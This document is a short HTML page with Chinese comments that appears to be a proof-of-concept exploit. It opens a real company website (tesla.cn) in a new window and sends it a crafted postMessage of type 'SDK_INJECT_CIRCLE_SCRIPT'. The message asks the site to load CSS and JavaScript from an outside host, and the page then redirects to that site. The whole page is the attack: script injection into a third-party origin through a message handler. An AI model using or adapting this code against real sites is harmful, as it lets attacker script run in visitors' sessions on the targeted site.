<!DOCTYPE html>
<html>
<head>
    <title>A网站（跨域版）</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>A网站（跨域场景）</h1>
    <button id="triggerBtn">打开跨域B网站并触发输出</button>

    <script>
        const B_ORIGIN = 'https://www.tesla.cn'; // 替换为实际B网站的完整域名（带端口）
        let bWindow = null;

        // 关键：在A窗口自身定义vds属性，跨域B网站依然可以从event.source读取
        window.vds = 1; // 这个值会被B网站打印

        document.getElementById('triggerBtn').addEventListener('click', () => {
            // 1. 打开跨域的旧B窗口
            bWindow = window.open(`${B_ORIGIN}`, '_blank');
            
            // 2. 等待B窗口加载完成后发送消息
            const sendMessage = () => {
                if (bWindow && !bWindow.closed) {
                    // 发送匹配B网站监听规则的消息，targetOrigin必须严格匹配B的域名
                    bWindow.postMessage({
                        type: "SDK_INJECT_CIRCLE_SCRIPT",
                        cssURL:"https://www.example.com/1.css",
                        jsURL:"https://www.example.com/1.js"
                    }, B_ORIGIN); // 这里必须是B的完整域名，不能用'*'
                    
                    console.log('已向跨域B网站发送触发消息，A窗口vds值为:', window.vds);
                    
                    // 发送完成后立即跳转到新B窗口，无任何延迟
                    window.location.href = `${B_ORIGIN}`;
                } else {
                    setTimeout(sendMessage, 100);
                }
            };
            sendMessage();
        });
    </script>
</body>
</html>
